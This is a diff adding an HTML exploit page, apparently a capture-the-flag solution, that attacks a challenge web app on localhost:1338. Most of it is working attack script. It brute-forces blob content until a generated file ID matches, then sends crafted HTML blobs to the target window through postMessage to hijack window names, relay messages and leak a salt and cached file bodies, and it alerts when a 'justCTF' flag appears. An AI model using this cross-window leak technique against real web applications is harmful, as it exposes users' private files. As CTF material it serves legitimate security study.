@@ -1,0 +1,107 @@
+<!--
+ Copyright 2025 Google LLC
+
+ Licensed under the Apache License, Version 2.0 (the "License");
+ you may not use this file except in compliance with the License.
+ You may obtain a copy of the License at
+
+     http://www.apache.org/licenses/LICENSE-2.0
+
+ Unless required by applicable law or agreed to in writing, software
+ distributed under the License is distributed on an "AS IS" BASIS,
+ WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ See the License for the specific language governing permissions and
+ limitations under the License.
+-->
+
+<body>
+<!-- <iframe style="width:100%;height:100%" name="exploit"></iframe> -->
+</body>
+<script src="http://localhost:1338/static/util.js"></script>
+
+<script>
+
+  const sleep = d => new Promise(r=>setTimeout(r,d));
+
+  async function generateBlob(content){
+    for(let i=0; i<1e3; i++){
+      const newContent = content + Math.random();
+      const blob = new Blob([newContent], {type: 'text/html'})
+      const file = new File([blob], 'test' + 'a'.repeat(50), {type: 'text/html'});
+      const id = await generateFileId(file);
+      if(id.includes('test')){
+        return blob
+      }
+    }
+    throw new Error("didn't find content");
+  }
+
+  onmessage = e => {
+    clearInterval(window.interval);
+    const body = new TextDecoder('utf-8').decode(e.data.body);
+    if(body.includes('justCTF')){
+      alert(body);
+    }
+    console.log(new TextDecoder('utf-8').decode(e.data.body));
+  }
+
+
+  onload = async () => {
+    window.appWin = open('http://localhost:1338/#', 'exploit', 'width=500,height=500');
+
+    await sleep(1000);
+
+    const blobName = await generateBlob(
+      `<script>window.name = "scf"; location = "${origin}/blank";<\/script>`);
+
+
+    const blobSalt = await generateBlob(`
+      <script>onload = () => {console.log('loaded', Date.now())}; onmessage = (e) => {opener.postMessage(e.data, '*')} <\/script>
+      leak salt`
+    );
+
+    const bodyLeak = await generateBlob(
+      `<script>location=URL.createObject<\/script>`
+    )
+
+    window.shareFile = function(blob, name){
+      const n = (name + 'a'.repeat(50)).slice(0, 50);
+      appWin.postMessage({
+        type:'share',
+        files:[{
+          blob: blob,
+          cached: true,
+          name: n
+        }]
+      }, '*');
+    }
+
+
+    shareFile(blobName, 'setname');
+    await sleep(1000);
+
+    window.innerWin = open('', 'scf');
+    appWin.location = 'http://localhost:1338/#133';
+    await sleep(1000);
+
+    for(let i=0; i<100; i++){
+
+        shareFile(blobSalt, 'sxpjfvcurrahqmvlgwgn8qdrajaiv3458jl5z8io6s0wuwqzp1');
+
+    }
+
+    setTimeout(()=>{
+      appWin.location = 'http://localhost:1338/#0';
+    }, 300);
+    setTimeout(()=>{
+      shareFile(blobSalt, 'xxx');
+    }, 0);
+
+    // setTimeout(async ()=>{
+    //   shareFile(blobSalt, 'sxpjfvcurrahqmvlgwgn8qdrajaiv3458jl5z8io6s0wuwqzp1');
+    // }, 3_000);
+    return;
+
+  }
+
+</script>
